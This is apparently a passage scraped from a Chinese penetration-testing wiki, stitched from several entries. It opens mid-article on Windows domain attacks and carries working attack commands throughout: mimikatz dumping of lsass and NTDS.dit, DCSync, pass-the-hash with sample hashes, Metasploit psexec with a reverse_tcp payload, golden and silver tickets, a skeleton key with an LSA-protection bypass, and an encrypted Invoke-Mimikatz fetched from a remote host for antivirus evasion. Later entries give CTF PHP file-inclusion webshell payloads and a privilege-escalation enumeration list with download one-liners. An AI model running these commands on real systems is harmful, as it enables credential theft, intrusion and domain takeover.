将lsass.dmp下载到本地后，然后执行mimikatz: Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full exit 为了方便复制与查看，可以输出到本地文件里面： Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full pssword.txt 0x03 读取域控中域成员Hash3.1 域控本地读取注：得在域控上以域管理员身份执行mimikatz 方法一：直接执行 Copy#提升权限privilege::debug抓取密码lsadump::lsa /patch 方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取： Copy#获取所有域用户lsadump::dcsync /domain:test.com /all /csv#指定获取某个用户的hashlsadump::dcsync /domain:test.com /user:test 3.2 导出域成员HashCopy 域账户的用户名和hash密码以域数据库的形式存放在域控制器的 %SystemRoot% tds\\NTDS.DIT 文件中。 这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库： Copy#创建快照ntdsutil snapshot activate instance ntds create quit quit#加载快照ntdsutil snapshot mount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit#Copy文件副本copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS tds.dit c: tds.dit 将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash： Copysecretsdump.py -ntds.dit -system system.hive LOCAL 除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）： 工具地址：https://github.com/zcgonvh/NTDSDumpEx/releases CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv (system.hive文件获取:reg save hklm\\system system.hive)NTDSDumpEx -d ntds.dit -o domain.txt -r (此命令适用于在域控本地执行) \\ 最后记得卸载删除快照： Copyntdsutil snapshot unmount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quitntdsutil snapshot delete 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit 3.3 secretsdump脚本直接导出域hash为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴： Copypython secretsdump.py rabbitmask:123456@192.168.15.181 首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功 0x04 哈希传递攻击PTH4.1 工作组环境当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。 Copy#使用administrator用户的NTLM哈希值进行攻击sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 Copy#使用xie用户的NTLM哈希值进行攻击sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。 或者可以直接将该主机的C盘映射到本地的K盘。\\ 注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。 4.2 域环境在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值 域：xie.com\\ 域控：WIN2008.xie.com Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:administrator /domain:xie.com /ntlm:dbd621b8ed24eb627d32514476fac6c5 Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击sekurlsa::pth /user:xie /domain:xie.com /ntlm:329153f560eb329c0e1deea55e88a1e9 4.3 MSF进行哈希传递Copy 有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 exploit/windows/smb/psexec 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。 Copymsf use exploit/windows/smb/psexecmsf exploit(psexec) set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) set lhost 192.168.10.27msf exploit(psexec) set rhost 192.168.10.14msf exploit(psexec) set smbuser Administratormsf exploit(psexec) set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #这里LM和NTLM我们已经获取到了msf exploit(psexec) exploit 0x05 票据传递攻击(PTT)5.1 黄金票据域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。 首先获取krbtgt的用户hash: Copymimikatz lsadump::dcsync /domain:xx.com /user:krbtgt 利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下： Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#导入刚才生成的票据kerberos::ptt test.kiribi#导入成功后可获取域管权限dir \\\\dc.abc.com\\c$ 5.2 白银票据黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信 白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信 Copy#在域控上导出 DC$ 的 HASHmimikatz log privilege::debug sekurlsa::logonpasswords#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt#cifs是指的文件共享服务，有了 cifs 服务权限，就可以访问域控制器的文件系统dir \\\\DC.ABC.COM\\C$ 5.3 skeleton keyskeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。 Copy#在域控上安装 skeleton keymimikatz.exe privilege::debug misc::skeleton#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatznet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator 微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。 Copy#适用系统windows 8.1windows server 2012 及以上 当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下: Copyprivilege::debug!+!processprotect /process:lsass.exe /remove misc::skeleton 5.4 MS14-068当我们拿到了一个普通域成员的账号后，想继续对该域进行渗透，拿到域控服务器权限。如果域控服务器存在 MS14_068 漏洞，并且未打补丁，那么我们就可以利用 MS14_068 快速获得域控服务器权限。 MS14-068编号 CVE-2014-6324，补丁为 3011780 ，如果自检可在域控制器上使用命令检测。 Copysysteminfo |find 3011780#为空说明该服务器存在MS14-068漏洞 操作链接：MS14-068复现(CVE-2014-6324)：https://www.cnblogs.com/-mo-/p/11890539.html 0x06 其他6.1 使用mimikatz导出chrome中的密码详情请见：链接 6.2 隐藏功能管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能： Copyprivilege::debugmisc::cmdmisc::regeditmisc::taskmgr 6.3 免杀处理Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。 首先在本地对Invoke-Mimikatz.ps1进行加密处理： Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password 密码 -Salt 随机数#默认生成的文件是evil.ps1-Password 设置加密的密钥-Salt 随机数，防止被暴力破解 将加密生成的evil.sp1脚本放在目标机上，执行如下命令： Copy#远程加载解密脚本poweshell.exe IEX(New-Object Net.WebClient).DownloadString(http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1)[String] $cmd = Get-Content .\\evil.ps1Invoke-Expression $cmd$decrypted = de password saltInvoke-Expression $decryptedInvoke-Mimikatz 更新: 2025-11-13 13:41:16原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/gge2wv6qsglwsfv7"},{"path":"/wiki/WP/文件包含/include(.php).html","content":"include( .php)include限制文件后缀if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c 可以用？ 来闭合 更新: 2025-09-06 15:37:31原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/2b447ea7f0be5c7a52f2792beb3b6e6e"},{"path":"/wiki/WP/文件包含/php_filter.html","content":"php_filterphp:访问各个输入输出流（IO streams），在CTF中经常使用的是php:filter和php:input,php:filter用于读取源码。 基本php:input用于执行php代码 php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=- wirte：写入- convert.base64-decode：对写进文件里的内容先进行一次base64解码，再写入- resource：指定写入的文件名- content提交的值是经过base64编码后的一句话木马//?php assert($_POST[x]);?文件创建成功后，直接蚁剑连接即可 string.rot13?php error_reporting(0);highlight_file(__FILE__);//flag in /flag$file = $_GET[file];$content = $_POST[content];file_put_contents($file,?php die();?.$content);? 这道题就是我们常说的绕过死亡代，因为在中间加上了?php die();?，这就会导致会终止php的执行，不会运行$content的值这里我们用另一个过滤器string.rot13rot13也就是凯撒13，ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。payload:GET提交/?file=php://filter/write=string.rot13/resource=3.phpPOST提交content=?cuc nffreg($_CBFG[k]);?poc解释string.rot13是凯撒13编码content提交的值是经过rot13编码后的一句话木马 补充：php:filter允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器格式为：php:filter 过滤器(read)| 过滤器(write) resource 目标文件参数：resource要过滤的列表read读列表，设置过滤器write写列表，设置过滤器 过滤器字符串过滤器string.rot13 string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。 str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。 string.toupper string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtoupper—将字符串转化为大写 string.tolower （自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtolower—将字符串转化为小写 string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。 转换过滤器如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。convert.base64convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为 长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。 convert.quotedconvert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。 convert.iconv.*这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 iconv — 字符串按要求的字符编码来转换 convery.iconv.*的使用有两种方法: convert.iconv..orconvert.iconv.123支持的字符编码有一下几种（详细参考官方手册） UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* 常见过滤器：string.xxx(字符过滤器): string.rot13、string.toupper、string.tolower、string.strip_tagsconvert.xxx (转换过滤器):convert.base64、convert.quoted-printable、convert.iconv等等compression.xxx(压缩过滤):compression.zlib、compression.bzip2、compression.zlib.deflate、compression.bzip2.compress等等mcrypt(加密过滤)：PHP 7.1.0起废弃！ #所以payload（php文件读取使用：convert.xxx (转换过滤器)）第三步：payload为：?filenamephp:filterconvert.iconv.base64*.base64resourceindex.php###发现显示未找到！应该是转换过滤器中的字符编码被禁止了，字符编码字典更换，爆破字符编码。常见字符编码：UCS-4*UCS-4BEUCS-4LE*UCS-4LEUCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win* 更新: 2025-09-06 15:37:34原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/3009410a27f49fd2a554f6b557160e65"},{"path":"/wiki/内网/提权/Win_信息收集.html","content":"Win_信息收集指南概述在每个部分中，我首先提供老的可靠的CMD命令，然后是一个Powershell实现的的等价命令。同时拥有这两种工具是非常好的，Powershell比传统的CMD更加灵活。然而，没有一个Powershell命令能等价于所有东西（或者CMD在某些事情上仍然更简单更好），所以一些部分将只包含常规的CMD命令。 操作系统操作系统类型和架构？它是否缺少任何补丁？ systeminfowmic qfe 环境变量有什么有趣的地方吗？域控制器在LOGONSERVER？ setGet-ChildItem Env: | ft Key,Value 有没有其他连接的驱动器？ net usewmic logicaldisk get caption,description,providernameGet-PSDrive | where $_.Provider -like Microsoft.PowerShell.Core\\FileSystem| ft Name,Root 用户 你是谁？ whoamiecho %USERNAME%$env:UserName 系统上有哪些用户？任何旧的用户配置文件没有被清理掉？ net usersdir /b /ad C:\\Users\\dir /b /ad C:\\Documents and Settings\\ # Windows XP and belowGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\\Users -Force | select Name 是否有其他人登录？ qwinsta 系统上有哪些用户组？ net localgroupGet-LocalGroup | ft Name 在管理员组中有哪些用户？ net localgroup AdministratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSource 用户自动登录对应的注册表中有些什么内容？ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2nul | findstr DefaultUserName DefaultDomainName DefaultPasswordGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon | select Default* Credential Manager中有什么有趣的东西？ cmdkey /list 我们可以访问SAM和SYSTEM文件吗？ %SYSTEMROOT%\\repair\\SAM%SYSTEMROOT%\\System32\\config\\RegBack\\SAM%SYSTEMROOT%\\System32\\config\\SAM%SYSTEMROOT%\\repair\\system%SYSTEMROOT%\\System32\\config\\SYSTEM%SYSTEMROOT%\\System32\\config\\RegBack\\system 程序，进程和服务 系统都安装了些什么软件？ dir /a C:\\Program Filesdir /a C:\\Program Files (x86)reg query HKEY_LOCAL_MACHINE\\SOFTWAREGet-ChildItem C:\\Program Files, C:\\Program Files (x86) | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name 有没有权限设置的比较脆弱的文件夹或文件的权限？ 在程序文件夹中（Program Folders）有哪些文件或文件夹赋予了所有人（Everyone）或用户（User）的完全权限？ icacls C:\\Program Files\\* 2nul | findstr (F) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (F) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr BUILTIN\\Users 修改程序文件夹（Program Folders）中的所有人（Everyone）或用户（User）的权限？ icacls C:\\Program Files\\* 2nul | findstr (M) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (M) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr BUILTIN\\UsersGet-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match Everyone catch Get-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match BUILTIN\\Users catch 你也可以上传Sysinternals中的accesschk来检查可写文件夹和文件。 accesschk.exe -qwsu Everyone *accesschk.exe -qwsu Authenticated Users *accesschk.exe -qwsu Users * 系统上正在运行的进程服务有哪些？有没有暴露的内部服务？如果是这样，我们可以打开它吗？请参阅附录中的端口转发。 tasklist /svctasklist /vnet startsc queryGet-Process | ft ProcessName,IdGet-Service 是否存在任何脆弱的服务权限？我们可以重新配置什么吗？你可以再次上传accesschk来检查权限。 accesschk.exe -uwcqv Everyone *accesschk.exe -uwcqv Authenticated Users *accesschk.exe -uwcqv Users * 有没有引用的服务路径？ wmic service get name,displayname,pathname,startmode 2nul |findstr /i Auto 2nul |findstr /i /v C:\\Windows\\\\ 2nul |findstr /i /v 是否设置了计划任务？任何自定义实现的计划任务？ schtasks /query /fo LIST 2nul | findstr TaskNamedir C:\\windows\\tasksGet-ScheduledTask | ft TaskName, State 系统启动时都运行了些什么？ wmic startup get caption,commandreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncedir C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startupdir C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\StartupGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | flGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ChildItem C:\\Users\\All Users\\Start Menu\\Programs\\StartupGet-ChildItem C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup AlwaysInstallElevated是否启用？我没有跑过这个，但没有伤害检查。 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 网络 连接到了哪一块网卡？是否有多个网络？ ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address 我们有哪些网络路线？ route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex ARP缓存中有什么？ arp -aGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 是否有连接到其他主机的网络连接？ netstat -ano hosts文件中的任何东西？ C:\\WINDOWS\\System32\\drivers\\etc\\hosts 防火墙是否打开？如果是又是怎样配置的？ netsh firewall show statenetsh firewall show confignetsh advfirewall firewall show rule name=allnetsh advfirewall export firewall.txt 任何其他有趣的接口配置？ netsh dump 有没有SNMP配置？ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /sGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse 有趣的文件和敏感信息 这部分内容的命令输出可能有点杂乱，所以你可能想把命令的输出重定向到txt文件中进行审查和解析。 在注册表中是否有任何密码？ reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s 查看是否存在没有清理掉的sysprep或unattended文件？ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2nulGet-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where ($_.Name -like *.xml -or $_.Name -like *.txt -or $_.Name -like *.ini) 如果服务器是IIS网络服务器，那么inetpub中有什么？以及任何隐藏的目录？web.config文件？ dir /a C:\\inetpub\\dir /s web.configC:\\Windows\\System32\\inetsrv\\config\\applicationHost.configGet-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue 在IIS日志目录中有些什么文件？ C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log 是否安装了XAMPP，Apache或PHP？任何有XAMPP，Apache或PHP配置文件？ dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnfGet-Childitem –Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue 系统中是否存在任何Apache网络日志？ dir /s access.log error.logGet-Childitem –Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue 系统中是否任何有趣的文件？可能在用户目录（桌面，文档等）？ dir /s *pass* == *vnc* == *.config* 2nulGet-Childitem –Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue 系统中是否有包含密码的文件？ findstr /si password *.xml *.ini *.txt *.config 2nulGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password 附录传输文件 在特权升级过程中的某个时候，你需要将文件放到你的目标上。下面是一些简单的方法来做到这一点。 Powershell Cmdlet（Powershell 3.0及更高版本） Invoke-WebRequest https://myserver/filename -OutFile C:\\Windows\\Temp\\filename Powershell一行代码实现方法： (New-Object System.Net.WebClient).DownloadFile(https://myserver/filename, C:\\Windows\\Temp\\filename) Powershell脚本 echo $webclient = New-Object System.Net.WebClient wget.ps1echo $url = http://IPADDRESS/file.exe wget.ps1echo $file = output-file.exe wget.ps1echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 通过文本文件的非交互式FTP。当你只有有限的命令执行时这很有用。 echo open 10.10.10.11 21 ftp.txtecho USER username ftp.txtecho mypassword ftp.txtecho bin ftp.txtecho GET filename ftp.txtecho bye ftp.txt ftp -v -n -s:ftp.txtCERTUTIL certutil.exe -urlcache -split -f https://myserver/filename outputfilename 转发端口 这对于暴露机器外部不可用的内部服务非常有用，通常是由于防火墙设置。 上传plink.exe到目标。 在攻击机器上启动SSH。 例如要公开SMB，在目标上运行： plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 注意：从Windows 10的秋季创作者更新版本开始，OpenSSH已经在Windows的beta版本中推出，所以我预计有一天我们可能只能使用普通的旧的SSH命令进行端口转发，具体取决于是否启用。 本地文件包含列表 这不是一个详尽的列表，安装目录会有所不同，我只列出了一些常见的文件路径。 C:\\Apache\\conf\\httpd.confC:\\Apache\\logs\\access.logC:\\Apache\\logs\\error.logC:\\Apache2\\conf\\httpd.confC:\\Apache2\\logs\\access.logC:\\Apache2\\logs\\error.logC:\\Apache22\\conf\\httpd.confC:\\Apache22\\logs\\access.logC:\\Apache22\\logs\\error.logC:\\Apache24\\conf\\httpd.confC:\\Apache24\\logs\\access.logC:\\Apache24\\logs\\error.logC:\\Documents and Settings\\Administrator\\NTUser.datC:\\php\\php.iniC:\\php4\\php.iniC:\\php5\\php.iniC:\\php7\\php.iniC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.logC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.logc:\\Program Files (x86)\\php\\php.iniC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.logC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.logC:\\Program Files\\FileZilla Server\\FileZilla Server.xmlC:\\Program Files\\MySQL\\my.cnfC:\\Program Files\\MySQL\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.iniC:\\Program Files\\php\\php.iniC:\\Users\\Administrator\\NTUser.datC:\\Windows\\debug\\NetSetup.LOGC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\php.iniC:\\Windows\\repair\\SAMC:\\Windows\\repair\\systemC:\\Windows\\System32\\config\\AppEvent.evtC:\\Windows\\System32\\config\\RegBack\\SAMC:\\Windows\\System32\\config\\RegBack\\systemC:\\Windows\\System32\\config\\SAMC:\\Windows\\System32\\config\\SecEvent.evtC:\\Windows\\System32\\config\\SysEvent.evtC:\\Windows\\System32\\config\\SYSTEMC:\\Windows\\System32\\drivers\\etc\\hostsC:\\Windows\\System32\\winevt\\Logs\\Application.evtxC:\\Windows\\System32\\winevt\\Logs\\Security.evtxC:\\Windows\\System32\\winevt\\Logs\\System.evtxC:\\Windows\\win.iniC:\\xampp\\apache\\conf\\extra\\httpd-xampp.confC:\\xampp\\apache\\conf\\httpd.confC:\\xampp\\apache\\logs\\access.logC:\\xampp\\apache\\logs\\error.logC:\\xampp\\FileZillaFTP\\FileZilla Server.xmlC:\\xampp\\MercuryMail\\MERCURY.INIC:\\xampp\\mysql\\bin\\my.iniC:\\xampp\\php\\php.iniC:\\xampp\\security\\webdav.htpasswdC:\\xampp\\sendmail\\sendmail.iniC:\\xampp\\tomcat\\conf\\server.xml 更新: 2025-11-11 20:13:14原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/pro8yegetrgisw99"},{"path":"/wiki/WP/文件包含/pear文件包含.html","content":"pear文件包含pear文件包含条件： 有文件包含点 开启了pear扩展 配置文件中register_argc_argv 设置为On,而默认为Off 例题 ?phperror_reporting(0);$file = $_GET[file];if(isset($file) !preg_match(/input|data|phar|log|filter/i,$file)) include $file;else show_source(__FILE__); if(isset($_GET[info])) phpinfo(); 我们利用pear扩展进行文件包含 1、远程文件下载实现远程文件包含poc:/?file=/usr/local/lib/php/pearcmd.phpcaigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php 它提示下载到这个目录”tmppeardownload1.php”，我们尝试包含它 2、生成配置文件，配置项传入我们恶意的php代码的形式poc：/?file=/usr/local/lib/php/pearcmd.php+-c+/tmp/ctf.php+-d+man_dir=?eval($_POST[1]);?+-s+ 由于hackbar会尝试编码写入的数据会变成这样%3C?eval($_POST[1]);?%3E;，所以我们使用burp修改一下发包 提示写入成功，尝试包含tmpctf.php 3、写配置文件方式poc:/?file=/usr/local/lib/php/pearcmd.phpaaaa+config-create+/var/www/html/?=`$_POST[1]`;?+1.php 由于可能会遇到前面的编码问题，我们还是用burp 然后访问网站根目录的1.php 因为我们写的poc是```符号包起来是的命令执行，要注意不是eval,我们直接用curl反弹 除了pearcmd还有peclcmd 更新: 2025-09-06 15:37:32原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/54abff66044255214b877f503d43406a"},{"path":"/wiki/WP/鏂囦欢鍖呭惈/session.html","content":"session题目if(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); $file = str_replace(., ???, $file); include($file);else highlight_file(__FILE__); 相关知识在php5.4之后php.ini开始有⼏个默认选项 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = “upload_progress_” 4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS” 5.session.use_strict_mode=off 第⼀个表示当浏览器向服务器上传⼀个⽂件时，php将会把此次⽂件上传的详细信息(如上传时间、上传进度等)存储在session当中 第⼆个表示当⽂件上传结束后，php将会⽴即清空对应session⽂件中的内容 